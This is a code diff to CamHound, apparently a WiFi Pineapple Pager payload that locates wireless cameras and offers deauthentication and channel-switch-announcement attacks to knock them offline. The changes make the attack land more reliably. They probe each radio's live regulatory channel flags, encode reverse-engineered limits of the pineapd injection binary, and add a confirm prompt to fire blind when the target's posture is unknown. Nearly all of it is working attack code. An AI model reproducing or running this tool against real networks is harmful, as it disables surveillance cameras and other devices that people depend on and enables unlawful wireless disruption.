@@ -14,7 +14,7 @@
 # Author: tsuinami-1112
 # Version: 1.0
 # Category: reconnaissance
-# Dependencies: _pineap, tcpdump + hexdump (Watch), iwinfo, /lib/hak5/oui.txt; cam_signatures.txt next
+# Dependencies: _pineap, tcpdump + hexdump or od (Watch), iwinfo, /lib/hak5/oui.txt; cam_signatures.txt next
 #               to this file or in the user payload directory (both are probed).
 #
 # LED State Descriptions
@@ -86,7 +86,7 @@ SCAN_IF="wlan0"         # reserved: posture cross-check iface, the enabled dummy
 BCN_CAP_SECS=4          # seconds to wait for a beacon when reading a target's posture
 BCN_CAP_COUNT=5         # beacons to capture per posture read (first usable one is parsed)
 POSTURE_TTL=300         # * seconds a posture badge stays cached per BSSID
-RESP_LOCK_SECS=20       # EXAMINE lock duration held across a response
+RESP_LOCK_SECS=20       # * EXAMINE lock duration held across a response (must exceed fire + settle)
 RESP_SETTLE_SECS=6      # * wait after transmitting before re-reading the target to judge the effect
 LOOT_DIR="/root/loot/CamHound"
 OUI_FILE="/lib/hak5/oui.txt"; OUI_FILE_ALT="/rom/lib/hak5/oui.txt"
@@ -172,6 +172,8 @@ load_overrides() {
   THR_STREAM_UP=$(cfg THR_STREAM_UP "$THR_STREAM_UP" 1)
   RESPONSE=$(cfg RESPONSE "$RESPONSE" 0)
   RESPONSE_CONFIRM=$(cfg RESPONSE_CONFIRM "$RESPONSE_CONFIRM" 0)
+  RESP_LOCK_SECS=$(cfg RESP_LOCK_SECS "$RESP_LOCK_SECS" 5)
+  RESP_SETTLE_SECS=$(cfg RESP_SETTLE_SECS "$RESP_SETTLE_SECS" 1)
   AUTO_RESPOND=$(cfg AUTO_RESPOND "$AUTO_RESPOND" 0)
   POSTURE_TTL=$(cfg POSTURE_TTL "$POSTURE_TTL" 0)
   DEDUPE_H=$(cfg DEDUPE_H "$DEDUPE_H" 0)
@@ -321,15 +323,94 @@ hex_octet() {   # hex_octet <hexstring> <index0> -> decimal octet, nonzero rc if
   printf '%d' "$(( 16#$b ))"
 }
 
-csa_injectable() {   # csa_injectable <band> <channel> -> 0 when the radio may legally transmit
+# Injectability is decided by two independent gates in series; a frame needs both.
+#   Gate 1 -- pineapd, in userspace.  A compiled-in channel switch, duplicated in
+#     pineap_wifi_interface::inject (0x46e800-0x46e826) and
+#     interface_tracker::inject_deauth (0x472c66-0x472c8a).  It never asks the kernel
+#     about regulatory state (no NL80211_CMD_GET_REG anywhere in the binary), so no
+#     regdb edit, country change or `iw reg set` can lift it.  pcap_inject has exactly
+#     one call site, inside the gated function, so every injected frame passes it.
+#   Gate 2 -- cfg80211, in the kernel.  cfg80211_reg_check_beaconing() rejects a
+#     monitor-mode frame whose channel is flagged DISABLED or NO_IR.  RADAR alone does
+#     not block it.  This gate DOES follow the regulatory domain, so it is read live.
+# Why guessing here is unsafe: a frame rejected by gate 2 is freed with NETDEV_TX_OK,
+# so nothing reports an error.  An over-permissive verdict therefore reads back as the
+# target having resisted, which is worse than refusing a channel that would have worked.
+# Full derivation and re-verification recipe: dev/pager-csa-primitives.md.
+PINEAPD_DFS_BLOCKED=" 52 56 60 64 100 104 108 112 116 120 124 128 132 136 140 144 "
+declare -A INJ_OK        # "<band>/<channel>" -> 1 permitted by gate 2, 0 refused
+INJ_PROBED=0             # 0 not yet probed, 1 probe usable, -1 probe failed -> fallback
+INJ_PROBE_TS=0
+
+# inj_probe must run in the PARENT shell: it populates INJ_OK, and csa_injectable is
+# reached from posture_from_caps inside $( ), where writes to globals are discarded.
+# shellcheck disable=SC2120   # `force` is deliberate API for a manual re-probe; no call site yet
+inj_probe() {   # inj_probe [force] -> 0 when INJ_OK is usable
+  local phy d line freq ch dis rows=""
+  [ "$1" = force ] || { (( INJ_PROBED != 0 && EPOCHSECONDS - INJ_PROBE_TS < POSTURE_TTL )) && return $(( INJ_PROBED == 1 ? 0 : 1 )); }
+  INJ_PROBE_TS=$EPOCHSECONDS; INJ_PROBED=-1; INJ_OK=()
+  command -v iw >/dev/null 2>&1 || return 1
+  # Every phy is probed and merged: pineapd picks its own inject interface, and each phy
+  # registers only its own bands, so band/channel keys do not collide across them.
+  for d in /sys/class/ieee80211/*; do
+    [ -e "$d" ] || continue
+    phy=${d##*/}
+    rows+=$(iw phy "$phy" channels 2>/dev/null)$'\n'
+  done
+  [ -n "${rows//[[:space:]]/}" ] || return 1
+  while IFS='|' read -r freq ch dis; do
+    [[ $freq =~ ^[0-9]+$ && $ch =~ ^[0-9]+$ ]] || continue
+    local band; band=$(band_of "$freq")
+    [ "$band" = '?' ] && continue
+    if (( dis == 0 )); then INJ_OK[$band/$ch]=1; else INJ_OK[$band/$ch]=0; fi
+  done < <(printf '%s' "$rows" | inj_parse_channels)
+  (( ${#INJ_OK[@]} )) || return 1
+  INJ_PROBED=1; return 0
+}
+
+# Parsed against the shipped iw's own format strings, not an invented layout: the channel
+# line is "\t* %d MHz [%d] " optionally followed by "(disabled)", then indented attribute
+# lines, of which only the NO_IR one blocks transmission ("Radar detection" does not -- gate 2
+# prohibits DISABLED and NO_IR, never RADAR).  iw spells that attribute three ways: "No IR" when
+# the kernel sets both NO_IR and the separate legacy NO_IBSS slot, otherwise "Passive scan" or
+# "No IBSS" -- all three must block, or an older kernel's NO_IR channel reads as injectable.
+# Matching "MHz [n]" loosely also covers the "phy%d %d MHz [%d]:" variant in the same binary.
+inj_parse_channels() {   # stdin: iw phy <phy> channels -> "freq|channel|blocked" rows
+  awk '
+      function flush() { if (ch != "") printf "%d|%d|%d\n", freq, ch, bad }
+      /MHz[ \t]*\[[0-9]+\]/ {
+          flush()
+          freq = $0; sub(/^[^0-9]*/, "", freq); sub(/[^0-9].*$/, "", freq)
+          ch = $0; sub(/^.*\[/, "", ch); sub(/\].*$/, "", ch)
+          bad = ($0 ~ /\(disabled\)/) ? 1 : 0
+          next
+      }
+      /^[ \t]+(No IR|Passive scan|No IBSS)[ \t]*$/ { if (ch != "") bad = 1; next }
+      /^[Bb]and [0-9]+:/    { flush(); ch = ""; next }
+      END { flush() }'
+}
+
+csa_injectable() {   # csa_injectable <band> <channel> -> 0 when a frame can actually leave
   local b="$1" c="$2"
   [[ $c =~ ^[0-9]+$ ]] || return 1
+  # gate 1: pineapd's compiled-in refusals, independent of regulatory state
+  [ "$b" = 5 ] && [[ $PINEAPD_DFS_BLOCKED == *" $c "* ]] && return 1
+  # 6 GHz stays refused: pineapd rejects a channel whose band field is 6 GHz outright,
+  # and whether our command path produces that encoding is unverified.  Until the
+  # determination plan settles it on real hardware, refusing is the safe verdict.
+  [ "$b" = 6 ] && return 1
+  # gate 2: the live regulatory state, when we managed to read it
+  if (( INJ_PROBED == 1 )); then
+    [ "${INJ_OK[$b/$c]}" = 1 ] && return 0
+    return 1                 # 0 = refused, unset = this phy never registered the channel
+  fi
+  # Fallback when the probe is unavailable: only what is injectable under BOTH the US
+  # and the world ("00") domain, since we cannot tell which one is live.  Under 00,
+  # 5 GHz 149-165 and 2.4 GHz 12-14 carry NO_IR and 2.4 GHz 12-14 are DISABLED under US.
   case "$b" in
-    2) return 0 ;;
-    5) (( c >= 36 && c <= 48 )) && return 0
-       (( c >= 149 && c <= 165 )) && return 0
-       return 1 ;;          # 52-144 is DFS: cfg80211 marks it NO_IR, injection is dropped
-    *) return 1 ;;          # 6 GHz is NO_IR for injection, and always WPA3 anyway
+    2) (( c >= 1 && c <= 11 )) && return 0; return 1 ;;
+    5) (( c >= 36 && c <= 48 )) && return 0; return 1 ;;
+    *) return 1 ;;
   esac
 }
 
@@ -368,6 +449,7 @@ posture_opts() {
   case "$1" in
     'NOINJ'|'NONE') printf '' ;;                 # regulatory wall, or beacon protection: nothing works
     'C')            printf 'CSA BOTH DEAUTH' ;;  # PMF required: deauth is ignored but stays offered
+    '?')            printf 'CSA BOTH DEAUTH' ;;  # posture unread: CSA lands on every badge but NONE
     *)              printf 'BOTH DEAUTH CSA' ;;
   esac
 }
@@ -420,6 +502,15 @@ rsn_caps() {   # rsn_caps <element 48 payload hex> -> 2-octet RSN Capabilities h
   cnt=$(hex_u16le "$h" "$p") || return 1; p=$(( p + 2 + 4 * cnt ))   # AKM suite list
   (( p + 2 <= n )) || return 1
   printf '%s' "${h:$(( p * 2 )):4}"
+}
+
+# Watch needs tcpdump plus a hex dumper. Both pcap readers below fall back to od, so either
+# dumper satisfies it; requiring hexdump specifically disabled Watch on hosts that have only od
+# (most non-busybox Linux) for no reason. A Pager always has busybox hexdump, so this only ever
+# mattered off-device -- but it made laptop and harness runs fail in a way that looked like a bug.
+capture_ready() {   # capture_ready -> 0 when a Watch capture can be taken and parsed
+  command -v tcpdump >/dev/null 2>&1 || return 1
+  command -v hexdump >/dev/null 2>&1 || command -v od >/dev/null 2>&1
 }
 
 pcap_bytes() {   # whole file as one lowercase hex string (od fallback mirrors pcap_words)
@@ -481,6 +572,10 @@ POSTURE_LAST='?'
 posture_of() {   # posture_of <bssid> <band> <channel> -> badge (stdout and POSTURE_LAST), cached per BSSID
   # Call it directly, not in $(...): the cache, POSTURE_RSN and POSTURE_EXT are set in the caller's shell.
   local bssid="$1" band="$2" ch="$3" f b now="$EPOCHSECONDS" locked_here=0
+  # Both early returns below answer without reading a beacon, so the caps globals must not keep the
+  # PREVIOUS target's values -- resp_write records them as this response's rsn_caps/beacon_prot and
+  # would otherwise attribute another BSSID's posture to this row. Only the badge itself is cached.
+  POSTURE_RSN=-; POSTURE_EXT=-
   if [ -n "${POSTURE[$bssid]}" ] && (( now - ${POSTURE_TS[$bssid]:-0} < POSTURE_TTL )); then
     POSTURE_LAST="${POSTURE[$bssid]}"; printf '%s' "$POSTURE_LAST"; return 0
   fi
@@ -854,7 +949,7 @@ preflight() {
   printf -v RUN_ID '%(%Y%m%d_%H%M%S)T' -1; RUN_T0=$EPOCHSECONDS
   if ! command -v _pineap >/dev/null 2>&1; then set_state FAIL; ERROR_DIALOG "CamHound: _pineap not found" 2>/dev/null; exit 0; fi
   command -v jq >/dev/null 2>&1 && HAVE_JQ=1
-  command -v tcpdump >/dev/null 2>&1 && command -v hexdump >/dev/null 2>&1 && HAVE_TCPDUMP=1
+  capture_ready && HAVE_TCPDUMP=1
   [ -r "$OUI_FILE" ] || OUI_FILE="$OUI_FILE_ALT"
   [ -r "$OUI_FILE" ] || LOG yellow "no oui.txt: vendor rows disabled, OUI rows only"
   for i in wlan0 wlan1 wlan1mon wlan0cli wlan0mon; do a=$(cat "/sys/class/net/$i/address" 2>/dev/null); [ -n "$a" ] && OWN_MACS+="${a,,} "; done
@@ -864,6 +959,7 @@ preflight() {
   if (( SIG_COUNT < 10 )); then load_signatures <(builtin_signatures); SIG_SOURCE="built-in"; fi
   (( SIG_COUNT == 0 )) && { set_state FAIL; ERROR_DIALOG "CamHound: no signatures" 2>/dev/null; exit 0; }
   load_inventory
+  inj_probe || LOG yellow "regulatory probe failed: injectable channels limited to the set that is safe in any domain"
 }
 BANDS_LINE=""; INSTALL_DIR=""
 run_lock() {
@@ -1415,6 +1511,7 @@ disrupt_menu() {   # the three attacks, ordered and labelled by what the beacon 
     LOG red "nothing to attack: no associated BSS or no channel for $mac"; return 0
   fi
   LOG "reading posture ${R_BSSID:9} ch $R_CH"
+  inj_probe                    # here, not inside posture_of: $( ) would discard the cache
   posture_of "$R_BSSID" "$R_BAND" "$R_CH" >/dev/null; badge="$POSTURE_LAST"
   opts=$(posture_opts "$badge")
   LOG "[$badge] ${R_BSSID:9} ch$R_CH ${R_BAND}GHz"$'\n'"target ${R_TARGET:9}"$'\n'"$(posture_why "$badge")"
@@ -1422,6 +1519,9 @@ disrupt_menu() {   # the three attacks, ordered and labelled by what the beacon 
     LOG red "$(posture_why "$badge")"
     confirm "Nothing is expected to work ($badge). Try anyway?" || return 0
     opts='BOTH DEAUTH CSA'
+  elif [ "$badge" = '?' ]; then
+    # No beacon was captured, so nothing below is advice -- say so instead of firing on one accept.
+    confirm "Posture unread on ${R_BSSID:9}: no beacon captured. Fire blind?" || return 0
   fi
   for k in $opts; do
     exp=$(posture_expect "$badge" "$k")
@@ -1443,7 +1543,7 @@ posture_why() {   # one line of plain English for a badge
     'D+C')   printf 'no PMF: deauth and CSA both land' ;;
     'D?+C')  printf 'PMF optional: deauth works per-client, CSA lands' ;;
     'C')     printf 'PMF required: deauth is ignored, CSA still lands' ;;
-    'NONE')  printf 'PMF + beacon protection: nothing here works' ;;
+    'NONE')  printf 'PMF + beacon protection: no frame this firmware sends works' ;;
     'NOINJ') printf 'DFS or 6 GHz: the radio may not transmit on this channel' ;;
     *)       printf 'posture unread: no beacon captured' ;;
   esac
